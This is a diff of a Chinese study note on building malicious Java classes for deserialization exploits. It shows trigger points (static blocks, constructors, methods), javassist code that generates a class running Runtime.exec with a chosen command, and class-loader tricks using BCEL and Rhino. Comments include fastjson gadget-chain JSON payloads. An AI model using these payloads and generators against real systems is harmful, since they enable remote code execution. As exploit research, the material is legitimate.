@@ -14,18 +14,21 @@ Summary:
 
 ### **0x1、恶意类构造及其触发方式**
 
+![](xmind/恶意类的构造-by bit4.png)
+
 如思维导图所示，总结了可以构造恶意类的几种方式：
 
-1. 利用静态代码块，在类的加载环境---初始化时被执行。（重点）
-2. 利用构造函数，在类实例化时执行。当然，在它前面必须执行初始化过程。
-3. 利用自定义函数，需要在函数调用时执行。
-4. 利用接口的重写方法，应该也是在函数调用时执行。
+1. 利用静态代码块，在类的加载环节之一【初始化】时触发（重点）---触发方法Class.forName() 
+2. 利用构造函数，在类实例化时触发（当然，实例化前必然先初始化）---触发方法newInstance()， new Evil()
+3. 利用自定义函数，在函数被调用时触发 --- 触发方法 xxx.fun()  m.invoke()
+4. 利用接口的重写方法，在函数调用时触发
 
-![](xmind/恶意类的构造-by bit4.png)
+**另外，通过类的加载流程可知：凡是能触发构造函数中代码的方法，都能触发静态代码块中的代码；凡是能触发自定义动态函数中代码的方法，都能触发静态代码块中的方法。**
 
 demo代码：
 
 ```java
+package evilClass;
 import java.io.IOException;
 import java.util.Hashtable;
 
@@ -45,7 +48,7 @@ public class  evilClassTest{
         	evilClazz cs1 = (evilClazz)yyy.newInstance();//这里触发构造函数中的命令。
         	
         	
-        	//触发方式2
+        	//触发方式2 xxxxClassLoader().loadClass();
     		Class<?> c1 = ClassLoader.getSystemClassLoader().loadClass("EvilClasses.evilClazz"); //这里不会触发静态代码块，因为是隐式加载方式。
     		c1.newInstance();//这里会触发静态代码块后，触发构造函数
 			
@@ -117,16 +120,21 @@ class evilClazz implements ObjectFactory{
 
 ### 0x2、用javassist字节码操作动态创建恶意类
 
-为什么需要动态创建恶意类？
+如下代码主要目的有2：
 
-1.防止缓存。因为类的加载是有缓存的？？？当短时间重复加载一个类时可能不会执行加载过程，从而命令执行失败？？？（不确定）
-
-2.动态输入命令，更加灵活。
+1. 使用javassist动态创建恶意类，可以动态指定命令和类名称，更为灵活。
+2. 尝试利用不同的类加载器，从不同来源获取类的byte[]流。 虽然来源不同，但触发机制和evilClassTest中还是一致的。
 
 ```java
+package evilClass;
 import java.io.File;
+import java.io.IOException;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
 import java.net.URL;
 import java.net.URLClassLoader;
+
+import com.sun.org.apache.bcel.internal.classfile.Utility;
 
 import javassist.ClassPool;
 import javassist.CtClass;
@@ -138,11 +146,11 @@ import javassist.bytecode.AccessFlag;
 
 public class createEvilClass {
 	
-	public static byte[] create(String cmd) {
+	public static byte[] create(String className,String cmd) {
 		
 		ClassPool pool = ClassPool.getDefault();
 		//会从classpath中查询该类
-		CtClass evilclass = pool.makeClass("Evil");
+		CtClass evilclass = pool.makeClass(className);
 		try {
 			CtField f= new CtField(CtClass.intType,"id",evilclass);//获得一个类型为int，名称为id的字段
 			f.setModifiers(AccessFlag.PUBLIC);//将字段设置为public
@@ -158,8 +166,9 @@ public class createEvilClass {
 			evilclass.addConstructor(ctConstructor1);
 			
 			//添加方法
-			CtMethod helloM=CtNewMethod.make("public void fun(){try{Runtime.getRuntime().exec(\""+cmd+"\");}catch(Exception e){e.printStackTrace();}}",evilclass);
-			evilclass.addMethod(helloM);
+			CtMethod funM=CtNewMethod.make("public void fun(){try{Runtime.getRuntime().exec(\""+cmd+"\");}catch(Exception e){e.printStackTrace();}}",evilclass);
+			evilclass.addMethod(funM);
+			evilclass.setName(className);
 			
 			evilclass.writeFile("D:\\");//将生成的.class文件保存到磁盘
 			byte[] b=evilclass.toBytecode();
@@ -172,9 +181,9 @@ public class createEvilClass {
 	}
 	
 	public static void main(String[] args) {
-
+		//!!!这里的测试，主要尝试利用不同的类加载器，获取不同来源的类byte[]!!!! 虽然来源不同，但触发机制和evilClassTest中还是一致的。//
 		
-/*		//从本地或者网络加载类
+/*		//从本地或者网络加载类，触发方式为loadClass()和newInstance();
 		try {
 			File file = new File("D:\\");
 			URL url = file.toURL();
@@ -189,23 +198,64 @@ public class createEvilClass {
 			e.printStackTrace();
 		}*/
 		
-		
+/*		//从本地或者网络加载类，但触发方式为Class.forName();
 		try {
 			File file = new File("D:\\");
 			URL url = file.toURL();
 			URL[] urls = new URL[]{url};
 			ClassLoader cl = new URLClassLoader(urls);
-			Class yyy = Class.forName("Evil",true,cl);
+			Class yyy = Class.forName("evil",true,cl);
 			
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
+		*/
 		
 		
+		//从classname(类名称)中加载类，触发方式为Class.forName();
+/*		//基于com.sun.org.apache.bcel.internal.util.ClassLoader的fastjosn的PoC就是利用了这种类加载机制和触发方式。
+		//{{"@type":"com.alibaba.fastjson.JSONObject","c":{"@type":"org.apache.tomcat.dbcp.dbcp.BasicDataSource","driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName":"xxx"}}:"ddd"}
+		//{{"@type":"com.alibaba.fastjson.JSONObject","c":{"@type":"org.apache.commons.dbcp.BasicDataSource","driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName":"xxx"}}:"ddd"}
 		byte[] st = createEvilClass.create("calc");
+		try {
+			String classname = Utility.encode(st,true);
+			System.out.println(classname);
+			classname = "org.apache.log4j.spi$$BCEL$$"+classname;
+			ClassLoader cls = new com.sun.org.apache.bcel.internal.util.ClassLoader();
+			Class.forName(classname, true, cls);
+		} catch (Exception e) {
+			e.printStackTrace();
+		}*/
+		
+		
+		//从byte[]中加载类，newInstance()触发;
+		//基于org.mozilla.javascript.DefiningClassLoader的 PoC可以在Commons Collections的漏洞中使用，因为它是invoke方式触发的，可以构造出来。
+		//而在fastjson中，则由于格式的限制，不能构造
+		try {
+			byte[] st = createEvilClass.create("evil","calc");
+			org.mozilla.javascript.DefiningClassLoader cl = new org.mozilla.javascript.DefiningClassLoader();
+			Class c = cl.defineClass("evil", st);
+			Method m = c.getMethod("fun");
+			c.newInstance();//会触发2次
+			//m.invoke(c.newInstance());//会触发2次
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+		
+/*		//从byte[]中加载类，Class.forName()触发;
+		//在fastjson的漏洞中，就是以Class.forName()的方式触发的，我们需要构造的是它的参数，而且这个参数要能通过fastjson的格式传入。
+		//根据自己现有的知识，还不能完成将这个classLoader用于fastjson的PoC~~~
+		try {
+			byte[] st = createEvilClass.create("evil","calc");
+			org.mozilla.javascript.DefiningClassLoader cl = new org.mozilla.javascript.DefiningClassLoader();
+			Class c = cl.defineClass("evil", st);
+			Class.forName("Evil",true,(ClassLoader)cl);//fastjson中存在的触发点是Class.forName()
+		} catch (Exception e) {
+			e.printStackTrace();
+		}*/
 	}
-
 }
+
 ```
 
 通过Bytecode Viewer查看生成的代码，并尝试加载，以测试是否正确。
